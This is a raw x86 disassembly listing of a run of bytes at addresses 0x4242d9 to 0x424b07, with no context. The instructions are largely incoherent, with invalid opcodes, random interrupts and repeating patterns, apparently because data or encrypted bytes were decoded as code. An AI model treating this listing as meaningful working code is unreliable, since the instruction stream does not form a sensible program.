  4242d9:	shr    edx,cl
  4242db:	sub    BYTE PTR [ebx+0x13],dl
  4242de:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242e2:	jbe    0x424281
  4242e4:	popa   
  4242e5:	and    DWORD PTR [esi-0x777278cb],eax
  4242eb:	or     cl,BYTE PTR [ebp-0x32781313]
  4242f1:	(bad)  
  4242f2:	in     eax,dx
  4242f3:	int    0x76
  4242f5:	dec    esp
  4242f6:	int    0x1
  4242f8:	adc    DWORD PTR [ecx+0x718080],eax
  4242fe:	xor    ch,cl
  424300:	jbe    0x42434e
  424302:	add    dh,dl
  424304:	in     eax,dx
  424305:	int    0x1
  424307:	adc    DWORD PTR [ecx+0x70008080],eax
  42430d:	dec    esp
  42430e:	leave  
  42430f:	jbe    0x4242b6
  424311:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424318:	dec    edx
  424319:	pop    ss
  42431a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424320:	xchg   esi,eax
  424321:	std    
  424322:	cmp    ecx,DWORD PTR [edi]
  424324:	cmp    ebx,ecx
  424326:	shr    ebx,cl
  424328:	xchg   edx,eax
  424329:	shr    edx,cl
  42432b:	sub    BYTE PTR [ebx+0x13],dl
  42432e:	or     dh,BYTE PTR [esi-0x4b]
  424331:	inc    ebx
  424332:	jge    0x42430a
  424334:	pop    eax
  424335:	int    0x76
  424337:	stc    
  424338:	int    0x8d
  42433a:	stc    
  42433b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42433e:	lock shl edx,cl
  424341:	sub    bl,dl
  424343:	mov    ebp,0xcdd35392
  424348:	lea    esp,[ebp+0x3ba596cd]
  42434e:	fnstcw WORD PTR [ebx]
  424350:	psrlq  mm5,mm2
  424353:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424359:	int    0x1
  42435b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  424361:	xchg   edx,eax
  424362:	push   ebx
  424363:	jecxz  0x424394
  424365:	rcl    ebp,1
  424367:	bound  eax,QWORD PTR [eax]
  424369:	jo     0x42439f
  42436b:	int    0x76
  42436d:	std    
  42436e:	int    0x8d
  424370:	std    
  424371:	cmp    edi,DWORD PTR [ecx+0x3b]
  424374:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42437b:	push   ebx
  42437c:	rol    DWORD PTR [ebx+0x76],cl
  42437f:	mov    ch,0xd6
  424381:	and    ch,cl
  424383:	jbe    0x424322
  424385:	int    0x8d
  424387:	popf   
  424388:	cmp    esi,eax
  42438a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42438d:	mov    ebp,0x28f2d392
  424392:	push   ebx
  424393:	jge    0x4243d8
  424395:	fld    TBYTE PTR [edi]
  424397:	pop    es
  424398:	xchg   esp,eax
  424399:	add    BYTE PTR [eax],al
  42439b:	add    ch,cl
  42439d:	jbe    0x42439c
  42439f:	int    0x8d
  4243a1:	std    
  4243a2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243a5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243ac:	push   ebx
  4243ad:	rol    DWORD PTR [ebx+0x76],cl
  4243b0:	mov    ch,0xd6
  4243b2:	and    ch,cl
  4243b4:	jbe    0x4243af
  4243b6:	int    0x8d
  4243b8:	stc    
  4243b9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243bc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243c3:	push   ebx
  4243c4:	rol    DWORD PTR [ecx-0x5f14428a],cl
  4243ca:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  4243d4:	leave  
  4243d5:	jbe    0x4243cc
  4243d7:	fdivr  st,st(4)
  4243d9:	sbb    al,0xb
  4243db:	int    0xa6
  4243dd:	std    
  4243de:	int    0x76
  4243e0:	std    
  4243e1:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  4243e7:	xchg   edx,eax
  4243e8:	shr    DWORD PTR [ebp-0x1462acd8],cl
  4243ee:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  4243f4:	std    
  4243f5:	int    0x8d
  4243f7:	std    
  4243f8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fb:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424402:	push   ebx
  424403:	ror    DWORD PTR [edx],cl
  424405:	jbe    0x4243f4
  424407:	int    0x76
  424409:	std    
  42440a:	int    0x8d
  42440c:	std    
  42440d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424410:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424417:	push   ebx
  424418:	ror    DWORD PTR [edx],cl
  42441a:	jbe    0x424411
  42441c:	int    0x8d
  42441e:	std    
  42441f:	int    0x76
  424421:	std    
  424422:	cmp    ecx,DWORD PTR [edi]
  424424:	cmp    ecx,ecx
  424426:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42442c:	push   ebx
  42442d:	jge    0x4243fc
  42442f:	jbe    0x4243c6
  424431:	inc    ebx
  424432:	jge    0x424408
  424434:	xchg   ch,cl
  424436:	test   BYTE PTR ds:0xcded760a,bl
  42443c:	jbe    0x4243eb
  42443e:	int    0x84
  424440:	sbb    eax,0xcdf5760a
  424445:	jbe    0x424444
  424447:	int    0x8d
  424449:	std    
  42444a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42444d:	lock shl edx,cl
  424450:	sub    bl,dl
  424452:	mov    ebp,0xcdd35392
  424457:	(bad)  
  424458:	in     eax,dx
  424459:	inc    ebx
  42445a:	rcl    esp,cl
  42445c:	push   esp
  42445d:	int    0x76
  42445f:	std    
  424460:	int    0x8d
  424462:	std    
  424463:	cmp    esi,eax
  424465:	cmp    edi,DWORD PTR [ecx-0x2d]
  424468:	repnz sub bl,dl
  42446b:	mov    ebp,0xcdd35392
  424470:	(bad)  
  424471:	in     eax,dx
  424472:	shr    ebx,cl
  424474:	sub    al,BYTE PTR [ebx-0x2d]
  424477:	aam    0x1c
  424479:	int    0x8d
  42447b:	in     eax,dx
  42447c:	int    0x76
  42447e:	dec    esp
  42447f:	int    0x1
  424481:	adc    DWORD PTR [ecx-0x44d07f80],eax
  424487:	retf   
  424488:	jno    0x42448a
  42448a:	(bad)  
  42448b:	mov    ch,0x0
  42448d:	jo     0x424417
  42448f:	in     al,dx
  424490:	push   ds
  424491:	int    0x76
  424493:	cmc    
  424494:	xchg   DWORD PTR [esi-0x78],esi
  424497:	int    0x8d
  424499:	dec    esp
  42449a:	int    0xa
  42449c:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244a2:	xchg   edx,eax
  4244a3:	jo     0x4244a5
  4244a5:	(bad)  
  4244a6:	mov    ch,0x0
  4244a8:	jno    0x424432
  4244aa:	or     dh,BYTE PTR [esi-0xb]
  4244ad:	int    0x76
  4244af:	std    
  4244b0:	int    0x8d
  4244b2:	std    
  4244b3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244b6:	lock shl edx,cl
  4244b9:	sub    bl,dl
  4244bb:	mov    ebp,0xcdd35392
  4244c0:	(bad)  
  4244c1:	cmc    
  4244c2:	inc    ebx
  4244c3:	ror    ebp,cl
  4244c5:	jbe    0x4244c0
  4244c7:	int    0x8d
  4244c9:	stc    
  4244ca:	(bad)  
  4244cb:	xor    DWORD PTR [ebx],edi
  4244cd:	jns    0x42450a
  4244cf:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4244d6:	push   ebx
  4244d7:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  4244dd:	cmp    esi,eax
  4244df:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244e2:	repnz sub bl,dl
  4244e5:	mov    ebp,0xcdd35392
  4244ea:	(bad)  
  4244eb:	cmc    
  4244ec:	das    
  4244ed:	rcl    ebx,1
  4244ef:	int    0x8d
  4244f1:	lods   eax,DWORD PTR ds:[esi]
  4244f2:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  4244f9:	(bad)  
  4244fa:	stc    
  4244fb:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244fe:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424505:	push   ebx
  424506:	rol    DWORD PTR [edi-0x2893263],cl
  42450c:	int    0x8d
  42450e:	std    
  42450f:	cmp    esi,eax
  424511:	cmp    edi,DWORD PTR [ecx-0x2d]
  424514:	repnz sub bl,dl
  424517:	mov    ebp,0xcdd35392
  42451c:	lea    ebp,[ebp+0x2f1f845e]
  424522:	push   es
  424523:	or     al,0xff
  424525:	add    BYTE PTR [eax],al
  424527:	int    0x76
  424529:	adc    ebp,ecx
  42452b:	lea    edx,[ecx]
  42452d:	ins    BYTE PTR es:[edi],dx
  42452e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424534:	test   BYTE PTR [eax-0x2cac7f80],al
  42453a:	int    0x8d
  42453c:	icebp  
  42453d:	push   esi
  42453e:	dec    ecx
  42453f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424545:	add    BYTE PTR [eax],al
  424547:	int    0x76
  424549:	std    
  42454a:	int    0x8d
  42454c:	std    
  42454d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424550:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424557:	push   ebx
  424558:	rcr    DWORD PTR [esi+0x76],cl
  42455b:	mov    ebp,0x76cd88d6
  424560:	stc    
  424561:	int    0x8d
  424563:	stc    
  424564:	in     al,dx
  424565:	xchg   ch,cl
  424567:	jbe    0x424566
  424569:	int    0x8d
  42456b:	std    
  42456c:	cmp    esi,eax
  42456e:	cmp    edi,DWORD PTR [ecx-0x56]
  424571:	shl    edx,cl
  424573:	sub    bl,dl
  424575:	mov    ebp,0xd353a892
  42457a:	arpl   bx,cx
  42457c:	ror    BYTE PTR [eax-0x12326980],cl
  424582:	add    al,0xed
  424584:	xor    al,0xc9
  424586:	jbe    0x424585
  424588:	dec    ecx
  424589:	and    DWORD PTR [esi-0x528936cb],eax
  42458f:	inc    ecx
  424590:	and    DWORD PTR [esi+0x4c76cd35],eax
  424596:	or     dh,BYTE PTR [esi+0x4c]
  424599:	cwde   
  42459a:	int    0x6d
  42459c:	int    0x76
  42459e:	std    
  42459f:	int    0x96
  4245a1:	std    
  4245a2:	sar    bh,0x5f
  4245a5:	shl    DWORD PTR [ecx],1
  4245a7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245ad:	cdq    
  4245ae:	shr    edx,cl
  4245b0:	sub    bl,dl
  4245b2:	mov    ebp,0xcdd25392
  4245b7:	xchg   esi,eax
  4245b8:	mov    BYTE PTR [ebx-0xf],al
  4245bb:	das    
  4245bc:	add    eax,0x80808159
  4245c1:	int    0x76
  4245c3:	mov    ch,cl
  4245c5:	xchg   esi,eax
  4245c6:	mov    BYTE PTR [edi+0xa9a6470],al
  4245cc:	xchg   esi,eax
  4245cd:	cmc    
  4245ce:	leave  
  4245cf:	jbe    0x4245ca
  4245d1:	popa   
  4245d2:	and    DWORD PTR [esi-0x68932cb],eax
  4245d8:	int    0x96
  4245da:	stc    
  4245db:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  4245e1:	rcl    ebx,cl
  4245e3:	mov    ebp,0xcdd25392
  4245e8:	xchg   esi,eax
  4245e9:	std    
  4245ea:	int    0xe6
  4245ec:	std    
  4245ed:	cmp    esp,ebx
  4245ef:	cmp    edi,edi
  4245f1:	shr    ecx,cl
  4245f3:	sub    bl,dl
  4245f5:	repz xchg edx,eax
  4245f7:	push   ebx
  4245f8:	fxch   st(5)
  4245fa:	out    0xf5,al
  4245fc:	pop    esi
  4245fd:	xchg   esp,eax
  4245fe:	leave  
  4245ff:	fsubr  QWORD PTR [edi]
  424601:	add    eax,0x8080816b
  424606:	int    0x96
  424608:	cmc    
  424609:	int    0x76
  42460b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424611:	or     ch,0x96
  424614:	mov    ch,cl
  424616:	out    0xf5,al
  424618:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42461e:	pop    ebx
  42461f:	int    0xa6
  424621:	std    
  424622:	cmp    edi,edx
  424624:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42462a:	in     eax,0x28
  42462c:	push   ebx
  42462d:	cld    
  42462e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424634:	add    eax,0x8080814f
  424639:	int    0x96
  42463b:	std    
  42463c:	int    0xe6
  42463e:	std    
  42463f:	cmp    esp,ebx
  424641:	cmp    edi,edi
  424643:	shl    ebx,cl
  424645:	xchg   edx,eax
  424646:	shr    ecx,cl
  424648:	sub    BYTE PTR [ebx-0x27],dl
  42464b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424651:	mov    dl,0x21
  424653:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424659:	out    0xfd,al
  42465b:	cmp    esp,ebx
  42465d:	cmp    edi,edi
  42465f:	shl    ebx,cl
  424661:	xchg   edx,eax
  424662:	shr    ecx,cl
  424664:	sub    BYTE PTR [ebx-0x27],dl
  424667:	jmp    0x42466b
  424669:	add    BYTE PTR [eax-0x2693280],0xcd
  424670:	(bad)  
  424671:	std    
  424672:	add    al,0xf7
  424674:	(bad)  
  424675:	cmp    esp,ebx
  424677:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  42467d:	push   ebx
  42467e:	cdq    
  42467f:	iret   
  424680:	ja     0x42467b
  424682:	jecxz  0x424673
  424684:	inc    ebx
  424685:	cdq    
  424686:	das    
  424687:	add    al,0x21
  424689:	add    BYTE PTR [eax-0x3004cc80],0xe4
  424690:	jo     0x42461a
  424692:	or     dl,dh
  424694:	mov    ch,0x2f
  424696:	mov    ebx,0xea121a
  42469b:	das    
  42469c:	add    BYTE PTR [eax-0x321269f6],0x96
  4246a3:	in     eax,dx
  4246a4:	xchg   DWORD PTR [eax],esi
  4246a6:	int    0xd6
  4246a8:	in     eax,dx
  4246a9:	xchg   DWORD PTR [eax-0x2d],edx
  4246ac:	repz sub bl,dl
  4246af:	mov    ecx,0x2ffb5392
  4246b4:	mov    ebx,0x4cf3d31a
  4246b9:	adc    dh,bh
  4246bb:	dec    ecx
  4246bc:	and    DWORD PTR [esi-0x1229f5cb],eax
  4246c2:	or     dl,BYTE PTR [esi-0x12693243]
  4246c8:	int    0xd6
  4246ca:	in     eax,dx
  4246cb:	cmp    esp,ebx
  4246cd:	add    al,0xf7
  4246cf:	call   ebx
  4246d1:	repz xchg edx,eax
  4246d3:	sar    DWORD PTR [ecx-0x7866acd8],cl
  4246d9:	xchg   esi,eax
  4246da:	mov    BYTE PTR [edx],cl
  4246dc:	xchg   esi,eax
  4246dd:	in     eax,dx
  4246de:	int    0x96
  4246e0:	dec    esp
  4246e1:	int    0xd6
  4246e3:	dec    esp
  4246e4:	cmp    esp,ebx
  4246e6:	add    al,0xf7
  4246e8:	call   ebx
  4246ea:	mov    ecx,0x92f3d328
  4246ef:	push   ebx
  4246f0:	cdq    
  4246f1:	int    0xd6
  4246f3:	mov    ebp,0x32d6fb43
  4246f8:	int    0x96
  4246fa:	dec    esp
  4246fb:	int    0xd6
  4246fd:	dec    esp
  4246fe:	cmp    esp,ebx
  424700:	add    al,0xf7
  424702:	call   ebx
  424704:	mov    ecx,0x92f3d328
  424709:	push   ebx
  42470a:	cdq    
  42470b:	int    0xd6
  42470d:	mov    ebp,0x88d6fb43
  424712:	int    0x96
  424714:	in     eax,dx
  424715:	int    0xd6
  424717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424718:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42471f:	mov    ch,0x2f
  424721:	push   es
  424722:	xchg   ebx,eax
  424723:	add    BYTE PTR [eax],al
  424725:	add    BYTE PTR [ecx-0x6932ee5a],al
  42472b:	stc    
  42472c:	int    0xd6
  42472e:	stc    
  42472f:	cmp    esp,ebx
  424731:	add    al,0xf7
  424733:	call   ebx
  424735:	mov    ecx,0x92f3d328
  42473a:	push   ebx
  42473b:	cdq    
  42473c:	int    0xd6
  42473e:	adc    ebp,ecx
  424740:	out    0xf5,al
  424742:	inc    ebx
  424743:	aam    0xd9
  424745:	in     al,0x77
  424747:	sub    al,0xcd
  424749:	xchg   esi,eax
  42474a:	std    
  42474b:	int    0xd6
  42474d:	std    
  42474e:	cmp    esp,ebx
  424750:	add    al,0xf7
  424752:	call   ebx
  424754:	repz xchg edx,eax
  424756:	sar    DWORD PTR [ecx+0x53c58728],cl
  42475c:	cdq    
  42475d:	int    0x9c
  42475f:	test   BYTE PTR [ebx-0x1e],al
  424762:	das    
  424763:	push   es
  424764:	test   BYTE PTR [eax],al
  424766:	add    BYTE PTR [eax],al
  424768:	arpl   bp,cx
  42476a:	jbe    0x424719
  42476c:	cmp    edx,ebx
  42476e:	int    0x8d
  424770:	lods   eax,DWORD PTR ds:[esi]
  424771:	add    al,0x2
  424773:	jmp    FWORD PTR [edx+0x76cd4aec]
  424779:	std    
  42477a:	cmp    edx,ebx
  42477c:	int    0x8d
  42477e:	std    
  42477f:	cmp    ecx,DWORD PTR [edi]
  424781:	shl    edx,cl
  424783:	sub    bl,dl
  424785:	mov    ebp,0xa8d35392
  42478a:	retf   
  42478b:	ror    BYTE PTR [eax-0x12326980],cl
  424791:	adc    ch,ch
  424793:	xchg   ebp,eax
  424794:	add    BYTE PTR [eax-0x2893680],0x49
  42479b:	and    DWORD PTR [esi-0x68936cb],eax
  4247a1:	inc    ecx
  4247a2:	and    DWORD PTR [esi-0x28932cb],eax
  4247a8:	int    0x8d
  4247aa:	std    
  4247ab:	cwde   
  4247ac:	call   0x8621:0xd169ffc0
  4247b3:	xor    eax,0xbdd3793b
  4247b8:	xchg   edx,eax
  4247b9:	mov    al,ds:0xf2d3133b
  4247be:	sub    BYTE PTR [ebx-0x2d],dl
  4247c1:	or     dh,BYTE PTR [esi-0x53]
  4247c4:	int    0x76
  4247c6:	std    
  4247c7:	int    0x8d
  4247c9:	std    
  4247ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4247cd:	mov    ebp,0xd3133b92
  4247d2:	repnz sub BYTE PTR [ebx-0x2d],dl
  4247d6:	or     dh,BYTE PTR [esi-0xf]
  4247d9:	int    0xe6
  4247db:	and    al,0xcd
  4247dd:	jbe    0x4247cc
  4247df:	int    0x8d
  4247e1:	in     eax,dx
  4247e2:	cmp    edx,ebx
  4247e4:	or     dh,BYTE PTR [esi-0x13]
  4247e7:	adc    dh,BYTE PTR [esi-0x13]
  4247ea:	dec    ecx
  4247eb:	mov    al,ds:0x76cd3586
  4247f0:	cmc    
  4247f1:	int    0x8d
  4247f3:	cmc    
  4247f4:	cmp    edx,ebx
  4247f6:	or     dh,BYTE PTR [esi-0xb]
  4247f9:	adc    dh,BYTE PTR [esi-0xb]
  4247fc:	dec    ecx
  4247fd:	lahf   
  4247fe:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424804:	lea    edx,[ecx]
  424806:	cmp    edx,ebx
  424808:	or     dh,BYTE PTR [esi+0x11]
  42480b:	adc    dh,BYTE PTR [esi+0x11]
  42480e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424814:	mov    ch,0xcd
  424816:	lea    esi,[ebp+0x760ad33b]
  42481c:	mov    ch,0x12
  42481e:	jbe    0x4247d5
  424820:	dec    ecx
  424821:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424828:	hlt    
  424829:	mov    esi,DWORD PTR ds:0x68876cd
  42482f:	ins    DWORD PTR es:[edi],dx
  424830:	das    
  424831:	add    eax,0x80808551
  424836:	int    0x76
  424838:	dec    esp
  424839:	push   es
  42483a:	ins    DWORD PTR es:[edi],dx
  42483b:	das    
  42483c:	add    eax,0x80808538
  424841:	int    0x76
  424843:	sbb    al,0x6
  424845:	ins    DWORD PTR es:[edi],dx
  424846:	das    
  424847:	add    eax,0x80808523
  42484c:	int    0x76
  42484e:	and    al,0xcd
  424850:	jbe    0x424876
  424852:	int    0x8d
  424854:	mov    bl,dl
  424856:	mov    ebp,0x39af5692
  42485b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  424862:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  42486c:	cmp    edi,DWORD PTR [ecx-0x2d]
  42486f:	mov    ebp,0xd3133b92
  424874:	repnz sub BYTE PTR [ebx-0x2d],dl
  424878:	or     dh,BYTE PTR [esi-0xf]
  42487b:	int    0x76
  42487d:	std    
  42487e:	int    0x76
  424880:	std    
  424881:	int    0x76
  424883:	mov    ch,cl
  424885:	lea    ecx,[eax-0x329b8379]
  42488b:	outs   dx,BYTE PTR ds:[esi]
  42488c:	jo     0x424898
  42488e:	lea    esp,[esi+eax*1]
  424891:	ins    DWORD PTR es:[edi],dx
  424892:	das    
  424893:	add    eax,0x808084f0
  424898:	leave  
  424899:	jbe    0x424830
  42489b:	dec    ecx
  42489c:	and    DWORD PTR [eax+0x35],edi
  42489f:	int    0x76
  4248a1:	xchg   ebp,eax
  4248a2:	pop    ebx
  4248a3:	int    0xa6
  4248a5:	xchg   ebp,eax
  4248a6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248a9:	loop   0x42487e
  4248ab:	mov    ebp,0x28e5d392
  4248b0:	push   ebx
  4248b1:	popf   
  4248b2:	or     ah,BYTE PTR [esi-0x289326b]
  4248b8:	int    0x76
  4248ba:	std    
  4248bb:	int    0x8
  4248bd:	sub    eax,0xcd808081
  4248c2:	xor    ch,cl
  4248c4:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  4248c8:	int    0x76
  4248ca:	std    
  4248cb:	int    0x76
  4248cd:	std    
  4248ce:	int    0x8
  4248d0:	and    eax,0xcd808081
  4248d5:	sbb    al,0xa
  4248d7:	xchg   esi,eax
  4248d8:	dec    esp
  4248d9:	inc    ebx
  4248da:	fst    st(6)
  4248dc:	push   0xffffffcd
  4248de:	(bad)  
  4248df:	cmc    
  4248e0:	int    0x8
  4248e2:	adc    DWORD PTR [ecx-0x69307f80],eax
  4248e8:	lods   eax,DWORD PTR ds:[esi]
  4248e9:	(bad)  
  4248ea:	int    0x96
  4248ec:	cmc    
  4248ed:	cmp    ecx,DWORD PTR [edi]
  4248ef:	add    al,0xfb
  4248f1:	call   ebx
  4248f3:	jmp    0x424887
  4248f5:	shr    edx,cl
  4248f7:	sub    BYTE PTR [ebx-0x1d],dl
  4248fa:	int    0x8d
  4248fc:	dec    esp
  4248fd:	bound  eax,QWORD PTR [eax]
  4248ff:	xchg   ecx,eax
  424900:	jo     0x42495d
  424902:	add    BYTE PTR [eax+0x24],dh
  424905:	int    0x8d
  424907:	dec    esp
  424908:	int    0x6e
  42490a:	xchg   esp,eax
  42490b:	int    0x7e
  42490d:	jo     0x424942
  42490f:	jge    0x424982
  424911:	xchg   ebp,eax
  424913:	jo     0x4248d2
  424915:	dec    esi
  424916:	xchg   BYTE PTR [eax+0x248dcd80],al
  42491c:	int    0x8
  42491e:	xor    eax,0xa808081
  424923:	sbb    al,0x0
  424925:	xchg   ecx,eax
  424926:	xchg   esp,eax
  424927:	add    dh,dl
  424929:	mov    BYTE PTR [ebx-0x43],bl
  42492c:	or     eax,0xcd808084
  424931:	pop    ebx
  424932:	fs xchg ebp,edx
  424935:	das    
  424936:	mov    ebx,0x74cf1452
  42493b:	xor    BYTE PTR [edx+ecx*1],bl
  42493e:	jbe    0x42495c
  424940:	int    0x76
  424942:	std    
  424943:	int    0x8d
  424945:	std    
  424946:	cmp    edi,DWORD PTR [ecx+0x4]
  424949:	add    bh,bh
  42494b:	shl    edx,cl
  42494d:	sub    bl,dl
  42494f:	mov    ebp,0x2fd35392
  424954:	mov    ebx,0x960a868a
  424959:	and    al,0x43
  42495b:	jge    0x42498c
  42495d:	add    eax,0x808080e9
  424962:	int    0x76
  424964:	std    
  424965:	int    0x8d
  424967:	std    
  424968:	cmp    edi,DWORD PTR [ecx+0x4]
  42496b:	add    bh,bh
  42496d:	shl    edx,cl
  42496f:	sub    bl,dl
  424971:	mov    ebp,0xad35392
  424976:	jbe    0x42491d
  424978:	int    0x76
  42497a:	stc    
  42497b:	int    0x8d
  42497d:	stc    
  42497e:	add    al,0x2
  424980:	(bad)  
  424981:	cmp    edi,DWORD PTR [ecx-0x2d]
  424984:	repnz sub bl,dl
  424987:	mov    ebp,0x2fd35392
  42498c:	mov    ebx,0x7d33868a
  424991:	pop    esi
  424992:	lea    esp,[ebp-0x7f2ef7d1]
  424998:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  42499f:	mov    BYTE PTR [edx],cl
  4249a1:	lea    ebx,[esp+ebp*8]
  4249a4:	xchg   ebp,ecx
  4249a6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249ad:	or     dh,BYTE PTR [esi-0x63]
  4249b0:	jl     0x4249b8
  4249b2:	icebp  
  4249b3:	aam    0x89
  4249b5:	clc    
  4249b6:	icebp  
  4249b7:	sub    edx,edx
  4249b9:	xchg   DWORD PTR [esi-0x63],esi
  4249bc:	in     al,dx
  4249bd:	xchg   edx,eax
  4249be:	int    0xd2
  4249c0:	jo     0x42498f
  4249c2:	outs   dx,BYTE PTR ds:[esi]
  4249c3:	test   BYTE PTR [edi+0x63bd70c5],al
  4249c9:	test   DWORD PTR [eax+0x1c76cd80],eax
  4249cf:	int    0x7c
  4249d1:	mov    BYTE PTR [edx],cl
  4249d3:	lea    ebx,[ebp-0x32027233]
  4249d9:	xchg   esi,eax
  4249da:	std    
  4249db:	cmp    ecx,DWORD PTR [edi]
  4249dd:	add    al,0xfb
  4249df:	call   ebx
  4249e1:	jmp    0x424975
  4249e3:	shr    edx,cl
  4249e5:	sub    BYTE PTR [ebx+0x13],dl
  4249e8:	pop    esi
  4249e9:	lea    ebx,[ebp-0x7232e32c]
  4249ef:	mov    BYTE PTR [edi-0x29ffb384],al
  4249f5:	popf   
  4249f6:	int    0x6c
  4249f8:	test   BYTE PTR [ecx-0x79],dh
  4249fb:	lds    esi,FWORD PTR [eax-0x43]
  4249fe:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a04:	sbb    al,0xcd
  424a06:	(bad)  
  424a07:	stc    
  424a08:	int    0x96
  424a0a:	stc    
  424a0b:	cmp    ecx,DWORD PTR [edi]
  424a0d:	shr    ebx,cl
  424a0f:	xchg   edx,eax
  424a10:	add    al,0xfb
  424a12:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a19:	push   ebx
  424a1a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a20:	and    al,0xa
  424a22:	jbe    0x424a40
  424a24:	int    0x76
  424a26:	stc    
  424a27:	int    0x8d
  424a29:	stc    
  424a2a:	add    al,0x2
  424a2c:	(bad)  
  424a2d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a30:	repnz sub bl,dl
  424a33:	mov    ebp,0xcdd35392
  424a38:	lea    esp,[edi+ebp*1]
  424a3b:	mov    ebx,0x7d33867e
  424a40:	pop    esi
  424a41:	lea    esp,[ebp+0xa4072f]
  424a47:	add    BYTE PTR [eax],al
  424a49:	int    0x8
  424a4b:	and    eax,0x43808081
  424a50:	sbb    al,0xd6
  424a52:	cmp    ecx,ebp
  424a54:	lea    edx,[ecx]
  424a56:	int    0x8
  424a58:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a5e:	lods   eax,DWORD PTR ds:[esi]
  424a5f:	(bad)  
  424a60:	int    0x96
  424a62:	adc    DWORD PTR [ebx],edi
  424a64:	(bad)  
  424a66:	sti    
  424a67:	call   ebx
  424a69:	jmp    0x4249fd
  424a6b:	shr    edx,cl
  424a6d:	sub    BYTE PTR [ebx-0x1d],dl
  424a70:	int    0x8d
  424a72:	dec    esp
  424a73:	bound  eax,QWORD PTR [eax]
  424a75:	xchg   ecx,eax
  424a76:	xchg   esp,eax
  424a77:	pop    ebx
  424a78:	add    BYTE PTR [eax+0x24],dh
  424a7b:	push   es
  424a7c:	ins    DWORD PTR es:[edi],dx
  424a7d:	das    
  424a7e:	add    eax,0x808092d9
  424a83:	int    0x96
  424a85:	and    al,0xcd
  424a87:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424a8d:	or     ch,0x7d
  424a90:	cmp    ecx,DWORD PTR [edi]
  424a92:	add    al,0x11
  424a94:	call   ebx
  424a96:	jmp    0x424a2a
  424a98:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424a9e:	add    eax,0x808081da
  424aa3:	int    0x76
  424aa5:	std    
  424aa6:	int    0x8d
  424aa8:	std    
  424aa9:	cmp    edi,DWORD PTR [ecx+0x4]
  424aac:	add    bh,bh
  424aae:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424ab4:	push   ebx
  424ab5:	ror    DWORD PTR [edx],cl
  424ab7:	jbe    0x424a76
  424ab9:	pop    ebp
  424aba:	push   0xcf35869f
  424abf:	jl     0x424a6e
  424ac1:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424ac7:	leave  
  424ac8:	jbe    0x424b0f
  424aca:	sbb    BYTE PTR [edi+0x76c93586],bl
  424ad0:	shr    al,1
  424ad2:	lahf   
  424ad3:	xchg   BYTE PTR ds:0xc955760a,dh
  424ad9:	jbe    0x424b48
  424adb:	dec    ecx
  424adc:	and    DWORD PTR [esi-0x3234c4cb],eax
  424ae2:	xchg   esp,eax
  424ae3:	iret   
  424ae4:	inc    ebp
  424ae5:	shl    ebx,cl
  424ae7:	xchg   edx,eax
  424ae8:	adc    bh,bl
  424aea:	scas   eax,DWORD PTR es:[edi]
  424aeb:	cmp    DWORD PTR [eax+0x150ab880],eax
  424af1:	lea    esi,[eax+eax*1+0x0]
  424af5:	add    BYTE PTR [esi+0x4],ch
  424af8:	cli    
  424af9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aff:	xchg   BYTE PTR ds:0x94060a,dh
  424b05:	add    BYTE PTR [eax],al
  424b07:	or     al,BYTE PTR [esi]
